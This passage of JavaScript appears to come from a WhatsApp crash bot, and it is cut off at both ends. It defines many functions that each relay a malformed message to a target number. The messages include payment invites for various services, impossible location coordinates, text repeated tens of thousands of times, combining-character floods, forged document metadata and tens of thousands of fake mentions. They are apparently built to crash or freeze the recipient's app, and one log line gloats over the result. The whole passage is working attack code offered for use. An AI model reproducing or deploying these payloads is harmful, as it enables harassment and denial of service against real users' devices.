                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "footer" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}
async function SqCrash(target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SQUARE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
    async function VenCrash(target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "VENMO",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
    async function AppXCrash(target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "CASHAPP",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
    async function SmCrash(target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SAMSUNGPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
async function FBiphone(target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
    async function QXIphone(target) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await sock.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://t.me/socksta",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
    async function QPayIos(target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
    async function QPayStriep(target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
    async function QDIphone(target) {
      sock.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Maaf Kak" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }
    //
    async function IosMJ(target, Ptcp = false) {
      await sock.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "Wanna With Yours :)" + "ꦾ".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJcoregy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3ocoreE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Ueheheheeh",
                body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJcoregy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3ocoreE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/varelmek",
                mediaUrl: "https://t.me/varelmek",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/varelmek",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_Client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    //
async function Starui(target, ptcp = true) {
    await sock.relayMessage(target, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "⭑̤▾ g͆Senkug̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ Crag̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺  ▾⭑̤",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true
              },
              hasMediaAttachment: true
            },
            body: {
              text: "VɑׁׅᖇꏂᏞ ᐯ ᙭ ᑌ I𓍯𓂃ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ ㅤ ㅤ ㅤㅤ ㅤ ㅤ𓍯̤𖣂  Ᏺ𝔈Ｌᴸ𝘖 𝐹𝕌C𝐊૯Ꮢ - U I\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ҉          𖣂𓍯̤\n" + "\n\n\n\n\n\n\n\n\n\n\n\n@1".repeat(150000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{}"
            },
            contextInfo: {
              mentionedJid: ["1@s.whatsapp.net"],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "OnLy ThE uI ᥴ𝕽𝐀ꇙհ",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: ""
                }
              }
            }
          }
        }
      }
    }, ptcp ? {
      participant: {
        jid: target
      }
    } : {});
    console.log(chalk.green("HAHAHAH UI BANG"));
  }
  async function VRL(target, Ptcp = true) {
	const jids = `_*~@1~*_\n`.repeat(10200);
	const ui = 'ꦽ'.repeat(1500);
   await sock.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "🐔고통스러운 ᥴ𝕽𝐀ꇙհ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: GetsuZo,
         },
         hasMediaAttachment: true,
        },
									body: { text: '🐔고통스러운 ᥴ𝕽𝐀ꇙհ' + ui + jids },
									contextInfo: {
										mentionedJid: ['6285817856153@s.whatsapp.net'],
										mentions: ['6285817856153@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["6285817856153@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "🐔고통스러운 ᥴ𝕽𝐀ꇙհ",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
	}
  async function f10(target, Ptcp = false) {
    await sock.relayMessage(target, {
      extendedTextMessage: {
